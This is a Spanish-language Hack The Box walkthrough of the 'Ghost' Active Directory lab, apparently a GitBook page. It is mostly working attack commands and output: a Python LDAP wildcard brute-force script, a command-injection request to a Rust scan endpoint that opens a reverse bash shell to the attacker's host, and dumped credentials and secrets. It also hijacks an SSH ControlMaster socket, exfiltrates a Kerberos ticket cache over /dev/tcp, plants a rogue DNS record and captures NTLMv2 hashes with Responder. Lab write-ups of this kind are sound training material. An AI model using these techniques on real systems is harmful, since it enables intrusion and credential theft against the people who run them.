---
icon: desktop
hidden: true
noIndex: true
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Copy of Copy of Ghost

<figure><img src="../../.gitbook/assets/Ghost.png" alt="" width="563"><figcaption></figcaption></figure>

***



```bash
❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.24 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-07 18:54 CET
Initiating SYN Stealth Scan at 18:54
Scanning 10.10.11.24 [65535 ports]
Completed SYN Stealth Scan at 18:56, 127.33s elapsed (65535 total ports)
Nmap scan report for 10.10.11.24
Host is up, received user-set (0.053s latency).
Scanned at 2025-02-07 18:54:34 CET for 127s
Not shown: 65508 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
8008/tcp  open  http             syn-ack ttl 127
8443/tcp  open  https-alt        syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49443/tcp open  unknown          syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
51066/tcp open  unknown          syn-ack ttl 127
51123/tcp open  unknown          syn-ack ttl 127
57044/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 127.43 seconds
           Raw packets sent: 131132 (5.770MB) | Rcvd: 177 (10.228KB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.24
	[*] Open ports: 53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389,49443,49664,49669,49675,51066,51123,57044

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389,49443,49664,49669,49675,51066,51123,57044 10.10.11.24 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-07 18:59 CET
Nmap scan report for 10.10.11.24
Host is up (0.066s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-07 18:00:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.10.11.24:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-02-07T18:02:20+00:00; +26s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.24:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-02-07T17:46:39
|_Not valid after:  2055-02-07T17:46:39
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-02-07T18:02:21+00:00; +27s from scanner time.
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2025-02-06T17:43:29
|_Not valid after:  2025-08-08T17:43:29
| rdp-ntlm-info: 
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2025-02-07T18:01:41+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8008/tcp  open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Ghost
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-generator: Ghost 5.78
8443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
| http-title: Ghost Core
|_Requested resource was /login
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
9389/tcp  open  mc-nmf        .NET Message Framing
49443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51066/tcp open  msrpc         Microsoft Windows RPC
51123/tcp open  msrpc         Microsoft Windows RPC
57044/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 26s, deviation: 0s, median: 25s
| smb2-time: 
|   date: 2025-02-07T18:01:41
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   99.71 ms 10.10.16.1
2   99.92 ms 10.10.11.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.54 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```





<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep ghost.htb
10.10.11.24 ghost.htb DC01.ghost.htb
```



```bash
❯ whatweb http://ghost.htb
http://ghost.htb [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-HTTPAPI/2.0], IP[10.10.11.24], Microsoft-HTTPAPI[2.0], Title[Not Found]

❯ whatweb http://ghost.htb:8008
http://ghost.htb:8008 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.24], MetaGenerator[Ghost 5.78], Open-Graph-Protocol[website], Script[application/ld+json], Title[Ghost], X-Powered-By[Express], nginx[1.18.0]

❯ whatweb https://ghost.htb:8443
https://ghost.htb:8443 [302 Found] Cookies[connect.sid], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.10.11.24], RedirectLocation[/login], X-Powered-By[Express], nginx[1.18.0]
https://ghost.htb:8443/login [200 OK] Cookies[connect.sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.10.11.24], Title[Ghost Core], X-Powered-By[Express], nginx[1.18.0]
```



<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep ghost.htb
10.10.11.24 ghost.htb DC01.ghost.htb federation.ghost.htb 
```



<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep ghost.htb
10.10.11.24 ghost.htb DC01.ghost.htb federation.ghost.htb intranet.ghost.htb gitea.ghost.htb
```



<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>



INTRANET



<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (14).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat users.txt
kathryn.holland
cassandra.shelton
robert.steeves
florence.ramirez
justin.bradley
arthur.boyd
beth.clark
charles.gray
jason.taylor
intranet_principal
gitea_temp_principal
```



<figure><img src="../../.gitbook/assets/imagen (15).png" alt=""><figcaption></figcaption></figure>



```python
import string
import requests

# Configuración
url = 'http://intranet.ghost.htb:8008/login'
headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Connection': 'keep-alive'
}

# Caracteres a probar (puedes ampliar si el login acepta mayúsculas o símbolos)
charset = string.ascii_lowercase + string.digits  
password = ""

while True:
    found = False
    for char in charset:
        test_password = f"{password}{char}*"

        files = {
            '1_ldap-username': (None, 'gitea_temp_principal'),
            '1_ldap-secret': (None, test_password),
            '0': (None, '[{},"$K1"]')
        }

        r = requests.post(url, headers=headers, files=files)

        if r.status_code == 303:  # Código de redirección indica login exitoso
            password += char
            print(f"[✔] Caracter encontrado: {char} → {password}")
            found = True
            break  # Salir del loop de caracteres y probar el siguiente

    if not found:
        print(f"[✅] Contraseña encontrada: {password}")
        break  # Si ningún carácter fue válido, finaliza

print(f"[🔓] Contraseña final: {password}")
```



```bash
❯ python3 brute_ldap.py
[✔] Caracter encontrado: s → s
[✔] Caracter encontrado: z → sz
[✔] Caracter encontrado: r → szr
[✔] Caracter encontrado: r → szrr
[✔] Caracter encontrado: 8 → szrr8
[✔] Caracter encontrado: k → szrr8k
[✔] Caracter encontrado: p → szrr8kp
[✔] Caracter encontrado: c → szrr8kpc
[✔] Caracter encontrado: 3 → szrr8kpc3
[✔] Caracter encontrado: z → szrr8kpc3z
[✔] Caracter encontrado: 6 → szrr8kpc3z6
[✔] Caracter encontrado: o → szrr8kpc3z6o
[✔] Caracter encontrado: n → szrr8kpc3z6on
[✔] Caracter encontrado: l → szrr8kpc3z6onl
[✔] Caracter encontrado: q → szrr8kpc3z6onlq
[✔] Caracter encontrado: f → szrr8kpc3z6onlqf
[✅] Contraseña encontrada: szrr8kpc3z6onlqf
[🔓] Contraseña final: szrr8kpc3z6onlqf
```



<figure><img src="../../.gitbook/assets/4571_vmware_kSUg7eN36b.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>



dockerfile

<figure><img src="../../.gitbook/assets/imagen (19).png" alt=""><figcaption></figcaption></figure>

docker-compose-yml

<figure><img src="../../.gitbook/assets/imagen (20).png" alt=""><figcaption></figcaption></figure>

posts-public.js

<figure><img src="../../.gitbook/assets/imagen (25).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://ghost.org/docs/content-api/" %}

<figure><img src="../../.gitbook/assets/imagen (21).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (22).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (23).png" alt=""><figcaption></figcaption></figure>

posts-public.js

<figure><img src="../../.gitbook/assets/imagen (24).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/4583_vmware_semX0MY3Ll.png" alt=""><figcaption></figcaption></figure>



/proc/self/environ

/proc/self/environ es un archivo especial en sistemas Linux que contiene las variables de entorno del proceso que lo lee. Detalles clave:

```
Se encuentra en el sistema de archivos proc (/proc/), que es una interfaz al kernel.
self es un enlace simbólico al directorio del proceso que lo accede.
Contiene las variables de entorno en formato KEY=VALUE, separadas por \0 (carácter nulo).
```

Ejemplo de uso:

Si ejecutamos:

cat /proc/self/environ

Veremos algo como:

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\0HOME=/root\0USER=root\0...

(Algunos valores pueden no verse bien porque están separados por \0).

Para verlo más claro:

tr '\0' '\n' < /proc/self/environ

Esto mostrará cada variable en una línea. ¿Para qué sirve?

```
Inspeccionar variables de entorno del proceso actual.
Depuración o debugging.
Puede ser útil en exploits, ya que podría exponer credenciales o configuraciones sensibles.
```

Posibles riesgos

Si un proceso con permisos elevados expone su /proc/self/environ, un atacante podría leer variables sensibles como AWS\_SECRET\_KEY, DATABASE\_PASSWORD, etc.



<figure><img src="../../.gitbook/assets/imagen (26).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (27).png" alt=""><figcaption></figcaption></figure>



intranet

<figure><img src="../../.gitbook/assets/imagen (28).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (29).png" alt=""><figcaption></figcaption></figure>



```bash
❯ unzip intranet.zip; cd intranet
```



```bash
❯ tree
.
├── backend
│   ├── Cargo.lock
│   ├── Cargo.toml
│   ├── diesel.toml
│   ├── Dockerfile
│   ├── migrations
│   │   ├── 2024-01-05-214725_news
│   │   │   ├── down.sql
│   │   │   └── up.sql
│   │   └── 2024-01-05-225610_forum
│   │       ├── down.sql
│   │       └── up.sql
│   └── src
│       ├── api
│       │   ├── dev
│       │   │   └── scan.rs
│       │   ├── dev.rs
│       │   ├── forum.rs
│       │   ├── ldap.rs
│       │   ├── login.rs
│       │   ├── me.rs
│       │   ├── news.rs
│       │   └── users.rs
│       ├── api.rs
│       ├── database
│       │   ├── models.rs
│       │   └── schema.rs
│       ├── database.rs
│       └── main.rs
├── docker-compose.yml
├── frontend
│   ├── Dockerfile
│   ├── next.config.js
│   ├── package.json
│   ├── postcss.config.js
│   ├── public
│   │   ├── next.svg
│   │   └── vercel.svg
│   ├── README.md
│   ├── src
│   │   ├── app
│   │   │   ├── (dashboard)
│   │   │   │   ├── forum
│   │   │   │   │   └── page.tsx
│   │   │   │   ├── layoutNavigation.tsx
│   │   │   │   ├── layout.tsx
│   │   │   │   ├── news
│   │   │   │   │   └── page.tsx
│   │   │   │   ├── profile
│   │   │   │   │   └── page.tsx
│   │   │   │   └── users
│   │   │   │       └── page.tsx
│   │   │   ├── globals.css
│   │   │   ├── layout.tsx
│   │   │   ├── login
│   │   │   │   ├── action.tsx
│   │   │   │   ├── form.tsx
│   │   │   │   └── page.tsx
│   │   │   ├── logout
│   │   │   │   └── route.tsx
│   │   │   └── page.tsx
│   │   ├── components
│   │   │   ├── drawer.tsx
│   │   │   └── navbar.tsx
│   │   ├── helpers
│   │   │   └── fetch.ts
│   │   └── hooks
│   │       └── useUser.tsx
│   ├── tailwind.config.js
│   ├── tsconfig.json
│   └── yarn.lock
└── README.md

23 directories, 50 files
```



```bash
❯ grep 'DEV_INTRANET_KEY' -r *
backend/src/api/dev.rs:                if key == std::env::var("DEV_INTRANET_KEY").unwrap() {
backend/.env.example:DEV_INTRANET_KEY=
```



{% code title="dev.rs" %}
```rust
use rocket::http::Status;
use rocket::Request;
use rocket::request::{FromRequest, Outcome};

pub(crate) mod scan;

pub struct DevGuard;

#[rocket::async_trait]
impl<'r> FromRequest<'r> for DevGuard {
    type Error = ();

    async fn from_request(request: &'r Request<'_>) -> Outcome<Self, Self::Error> {
        let key = request.headers().get_one("X-DEV-INTRANET-KEY");
        match key {
            Some(key) => {
                if key == std::env::var("DEV_INTRANET_KEY").unwrap() {
                    Outcome::Success(DevGuard {})
                } else {
                    Outcome::Error((Status::Unauthorized, ()))
                }
            },
            None => Outcome::Error((Status::Unauthorized, ()))
        }
    }
}
```
{% endcode %}



{% code title="scan.rs" %}
```rust
use std::process::Command;

use rocket::serde::json::Json;
use rocket::serde::Serialize;
use serde::Deserialize;

use crate::api::dev::DevGuard;

#[derive(Deserialize)]
pub struct ScanRequest {
    url: String,
}

#[derive(Serialize)]
pub struct ScanResponse {
    is_safe: bool,
    // remove the following once the route is stable
    temp_command_success: bool,
    temp_command_stdout: String,
    temp_command_stderr: String,
}

// Scans an url inside a blog post
// This will be called by the blog to ensure all URLs in posts are safe
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();

    match result {
        Ok(output) => {
            Json(ScanResponse {
                is_safe: true,
                temp_command_success: true,
                temp_command_stdout: String::from_utf8(output.stdout).unwrap_or("".to_string()),
                temp_command_stderr: String::from_utf8(output.stderr).unwrap_or("".to_string()),
            })
        }
        Err(_) => Json(ScanResponse {
            is_safe: true,
            temp_command_success: false,
            temp_command_stdout: "".to_string(),
            temp_command_stderr: "".to_string(),
        })
    }
}
```
{% endcode %}



<figure><img src="../../.gitbook/assets/imagen (30).png" alt=""><figcaption></figcaption></figure>



```bash
❯ curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"http://gzzcoo.com;/bin/bash -i >& /dev/tcp/10.10.16.7/443 0>&1"}'
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.24] 49786
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@36b733906694:/app# hostname -I
hostname -I
172.18.0.3 
```



```bash
root@36b733906694:/app# env
SHELL=bash
DATABASE_URL=./database.sqlite
HOSTNAME=36b733906694
PWD=/app
HOME=/root
CARGO_HOME=/usr/local/cargo
LDAP_BIND_DN=CN=Intranet Principal,CN=Users,DC=ghost,DC=htb
LDAP_HOST=ldap://windows-host:389
LDAP_BIND_PASSWORD=He!KA9oKVT3rL99j
TERM=xterm
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
RUSTUP_HOME=/usr/local/rustup
ROCKET_ADDRESS=0.0.0.0
SHLVL=3
RUST_VERSION=1.79.0
PATH=/usr/local/cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
JWT_SECRET=*xopkAGbLyg9bK_A
_=/usr/bin/env
```



```bash
❯ nxc smb 10.10.11.24 -u users.txt -p 'He!KA9oKVT3rL99j' --continue-on-success
SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.24     445    DC01             [-] ghost.htb\kathryn.holland:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
SMB         10.10.11.24     445    DC01             [-] ghost.htb\cassandra.shelton:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
SMB         10.10.11.24     445    DC01             [-] ghost.htb\robert.steeves:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
SMB         10.10.11.24     445    DC01             [-] ghost.htb\florence.ramirez:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
SMB         10.10.11.24     445    DC01             [-] ghost.htb\justin.bradley:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
SMB         10.10.11.24     445    DC01             [-] ghost.htb\arthur.boyd:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
SMB         10.10.11.24     445    DC01             [-] ghost.htb\beth.clark:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
SMB         10.10.11.24     445    DC01             [-] ghost.htb\charles.gray:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
SMB         10.10.11.24     445    DC01             [-] ghost.htb\jason.taylor:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
SMB         10.10.11.24     445    DC01             [+] ghost.htb\intranet_principal:He!KA9oKVT3rL99j 
SMB         10.10.11.24     445    DC01             [-] ghost.htb\gitea_temp_principal:He!KA9oKVT3rL99j STATUS_LOGON_FAILURE 
```



```bash
root@36b733906694:/# ls -l
total 76
drwxr-xr-x   1 root root 4096 Jul  5  2024 app
lrwxrwxrwx   1 root root    7 Jul  1  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Mar 29  2024 boot
drwxr-xr-x   5 root root  340 Feb  7 17:46 dev
-rwxr-xr-x   1 root root  215 Jul 22  2024 docker-entrypoint.sh
drwxr-xr-x   1 root root 4096 Jul 22  2024 etc
drwxr-xr-x   2 root root 4096 Mar 29  2024 home
lrwxrwxrwx   1 root root    7 Jul  1  2024 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jul  1  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Jul  1  2024 media
drwxr-xr-x   2 root root 4096 Jul  1  2024 mnt
drwxr-xr-x   2 root root 4096 Jul  1  2024 opt
dr-xr-xr-x 196 root root    0 Feb  7 17:46 proc
drwx------   1 root root 4096 Jul  5  2024 root
drwxr-xr-x   1 root root 4096 Jul  5  2024 run
lrwxrwxrwx   1 root root    8 Jul  1  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Jul  1  2024 srv
dr-xr-xr-x  13 root root    0 Feb  7 17:46 sys
drwxrwxrwt   1 root root 4096 Jul  5  2024 tmp
drwxr-xr-x   1 root root 4096 Jul  1  2024 usr
drwxr-xr-x   1 root root 4096 Jul  1  2024 var
root@36b733906694:/# cat docker-entrypoint.sh 
#!/bin/bash

mkdir /root/.ssh
mkdir /root/.ssh/controlmaster
printf 'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes' > /root/.ssh/config

exec /app/ghost_intranet
```



```bash
root@36b733906694:~/.ssh/controlmaster# ls -la
total 12
drwxr-xr-x 1 root root 4096 Feb  7 17:47 .
drwxr-xr-x 1 root root 4096 Jul  5  2024 ..
srw------- 1 root root    0 Feb  7 17:47 florence.ramirez@ghost.htb@dev-workstation:22
root@36b733906694:~/.ssh/controlmaster# file florence.ramirez\@ghost.htb\@dev-workstation\:22 
florence.ramirez@ghost.htb@dev-workstation:22: socket
```



```bash
root@36b733906694:~/.ssh/controlmaster# ssh -O check -S ~/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@ghost.htb
Master running (pid=24)
florence.ramirez@LINUX-DEV-WS01:~$ hostname -I
172.18.0.2 
florence.ramirez@LINUX-DEV-WS01:~$ id
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
```



```bash
florence.ramirez@LINUX-DEV-WS01:~$ id
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
florence.ramirez@LINUX-DEV-WS01:~$ env
SHELL=/bin/bash
PWD=/home/GHOST/florence.ramirez
KRB5CCNAME=FILE:/tmp/krb5cc_50
LOGNAME=florence.ramirez
MOTD_SHOWN=pam
HOME=/home/GHOST/florence.ramirez
SSH_CONNECTION=172.18.0.3 54228 172.18.0.2 22
TERM=xterm
USER=florence.ramirez
SHLVL=1
SSH_CLIENT=172.18.0.3 54228 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
SSH_TTY=/dev/pts/0
_=/usr/bin/env
```



```bash
florence.ramirez@LINUX-DEV-WS01:/tmp$ ls -la krb5cc_50 
-rw------- 1 florence.ramirez staff 1650 Feb  7 19:49 krb5cc_50
```



```bash
❯ nc -nlvp 443 > krb5cc_50
listening on [any] 443 ...
```



```bash
florence.ramirez@LINUX-DEV-WS01:/tmp$ cat krb5cc_50 > /dev/tcp/10.10.16.7/443
```



```bash
❯ ls -l krb5cc_50
.rw-rw-r-- kali kali 1.6 KB Fri Feb  7 20:51:29 2025  krb5cc_50
❯ file krb5cc_50
krb5cc_50: data
```



```bash
❯ export KRB5CCNAME=$(pwd)/krb5cc_50
❯ klist -i
Ticket cache: FILE:/home/kali/Desktop/HackTheBox/Windows/AD/Ghost/content/krb5cc_50
Default principal: florence.ramirez@GHOST.HTB

Valid starting     Expires            Service principal
07/02/25 20:51:02  08/02/25 06:51:02  krbtgt/GHOST.HTB@GHOST.HTB
	renew until 08/02/25 20:51:01
```



```bash
❯ nxc smb 10.10.11.24 -u 'florence.ramirez' -k --use-kcache
SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.24     445    DC01             [+] ghost.htb\florence.ramirez from ccache 
```





<figure><img src="../../.gitbook/assets/4590_vmware_FS9P8EQFLV.png" alt=""><figcaption></figcaption></figure>



```bash
❯ bloodyAD --host dc01.ghost.htb -d ghost.htb -k get dnsDump

zoneName: ghost.htb

SOA.PrimaryServer: dc01.ghost.htb
SOA.zoneAdminEmail: hostmaster@ghost.htb
NS: dc01.ghost.htb
A: 10.0.0.254; 127.0.0.1; 10.10.11.24
recordName: ghost.htb

recordName: _gc._tcp.ghost.htb
SRV: primary.corp.ghost.htb:3268; dc01.ghost.htb:3268

recordName: _gc._tcp.Default-First-Site-Name._sites.ghost.htb
SRV: primary.corp.ghost.htb:3268; dc01.ghost.htb:3268

recordName: _kerberos._tcp.ghost.htb
SRV: dc01.ghost.htb:88
...[snip]...
```



```bash
❯ bloodyAD --host dc01.ghost.htb -d ghost.htb -k get dnsDump > dnsDump.txt
❯ grep 'bitbucket' dnsDump.txt
```



```bash
❯ bloodyAD --host dc01.ghost.htb -d ghost.htb -k add dnsRecord bitbucket 10.10.16.7
[+] bitbucket has been successfully added
```



```bash
❯ sudo responder -I tun0
...[snip]...
[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.10.11.24
[HTTP] NTLMv2 Username : ghost\justin.bradley
